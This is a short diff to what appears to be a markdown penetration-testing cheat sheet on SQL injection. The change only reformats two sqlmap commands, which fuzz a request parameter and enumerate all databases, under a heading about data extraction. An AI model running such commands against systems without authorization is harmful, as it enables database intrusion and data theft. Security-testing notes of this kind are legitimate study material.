@@ -20,7 +20,7 @@
 > [!Success]  Method 2
 > Fuzzing query Testing
 >```sql
-sqlmap -r request.txt -p inputvartoFUZZ --random-agent
+>sqlmap -r request.txt -p inputvartoFUZZ --random-agent
 >```
 > Specify Some Technique
 > ```sql
@@ -33,7 +33,7 @@ sqlmap -r request.txt -p inputvartoFUZZ --random-agent
 >```
 >Return All Databases
 >```sql
-sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
+>sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
 >```
 
 > [!danger] Step To Extraction Data
